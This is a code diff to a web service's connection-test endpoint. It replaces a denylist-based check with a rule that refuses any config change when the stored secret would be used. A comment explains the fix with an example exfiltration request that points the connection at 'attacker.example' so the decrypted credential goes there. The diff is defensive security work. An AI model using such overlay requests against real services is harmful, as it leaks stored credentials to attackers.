@@ -22,7 +22,7 @@ import {
 } from '../repo/index.js';
 import { newId } from '../repo/ids.js';
 import { regateTriggersForConnection } from '../run/connection-readiness.js';
-import { boundaryKeysChangedByOverlay, probeConnection } from '../connectors/probe.js';
+import { configKeysChangedByOverlay, probeConnection } from '../connectors/probe.js';
 import { SecretDecryptionError, decrypt, encrypt } from '../secrets/secrets.js';
 import { NotFoundError } from '../errors.js';
 import { pageArgsFromQuery, requireOwned } from './util.js';
@@ -252,21 +252,34 @@ export const connectionsRoutes: FastifyPluginAsync = async (fastify) => {
    * Reaching the stored plaintext at all is a capability POST-ing a draft does
    * not have. Combine it with a free-form config overlay and you get an
    * exfiltration primitive: `{config: {...stored, host: 'attacker.example'}}`
-   * with no `secret` would decrypt this connection's password and send it to a
-   * host chosen in the request body. That is verbatim the threat
-   * `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS` was written against ("an
-   * overridable host sends the password to a server the connection's owner never
-   * named"), and the usual answer — the owner could PATCH those keys anyway —
-   * does not hold here, because a PATCH is a persisted, inspectable mutation
-   * that still never reveals the plaintext.
+   * with no `secret` would decrypt this connection's credential and send it
+   * wherever the request body said. For `postgres` that is the password; for
+   * `anthropic_api`, `openai_api` and `http` it is the API key, sent as an auth
+   * header to `config.baseUrl` by their own probes.
    *
-   * So: an overlay that CHANGES one of those keys is refused when the probe
-   * would otherwise fall back to the stored secret. The refusal is narrow by
-   * construction — it does not fire when the body supplies its own secret
-   * (nothing stored is spent), nor when the connection holds no secret (there
-   * is nothing to exfiltrate, which is what keeps `fs`/`sqlite` `roots` edits
-   * probeable), and it names the offending keys and the way forward rather than
-   * failing blank.
+   * The usual answer — the owner could PATCH those keys anyway — does not hold
+   * here, because a PATCH is a persisted, inspectable mutation that STILL never
+   * reveals the plaintext. Reading a secret out is the one thing no other route
+   * offers, so this is the one route that has to earn it.
+   *
+   * THE RULE IS TOTAL: falling back to the stored secret requires the config to
+   * be EXACTLY as stored. Not "no dangerous key changed" — no key changed.
+   *
+   * The first version of this asked `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS`
+   * which keys were dangerous, and that was a hole, not a subtlety: the table is
+   * empty for the three API-key kinds above, so the guard silently permitted
+   * exactly the exfiltration it was written to stop, for the kinds whose
+   * credential is easiest to spend. An allowlist of dangerous keys is a
+   * standing bet that no adapter will ever grow a new way to send a secret
+   * somewhere, and it fails OPEN. Comparing the whole config cannot.
+   *
+   * The refusal stays narrow where narrowness is free, and each exemption is a
+   * fact about the request rather than a guess about a kind: it does not fire
+   * when the body supplies its own secret (nothing stored is spent), nor when
+   * the connection holds no secret (there is nothing to exfiltrate — which is
+   * what keeps every `fs`/`sqlite` edit probeable), nor when no config overlay
+   * was sent at all. It names the changed keys and the two ways forward rather
+   * than failing blank.
    */
   fastify.post<{ Params: { id: string } }>('/api/connections/:id/test', async (request) => {
     const existing = requireOwned(
@@ -281,13 +294,13 @@ export const connectionsRoutes: FastifyPluginAsync = async (fastify) => {
     let secret: string | null = body.secret ?? null;
     const usingStoredSecret = body.secret === undefined && existing.secretRef !== null;
     if (usingStoredSecret && body.config !== undefined) {
-      const crossed = boundaryKeysChangedByOverlay(existing.kind, existing.config, body.config);
-      if (crossed.length > 0) {
+      const changed = configKeysChangedByOverlay(existing.config, body.config);
+      if (changed.length > 0) {
         const result: ConnectionProbeResult = {
           ok: false,
           error:
-            `this test would send the stored secret somewhere the saved connection does not point ` +
-            `(${crossed.join(', ')} changed) — save the change, or type the secret to test it here`,
+            `this test would spend the stored secret on settings the saved connection does not have ` +
+            `(${changed.join(', ')} changed) — save the change, or type the secret to test it here`,
         };
         return result;
       }
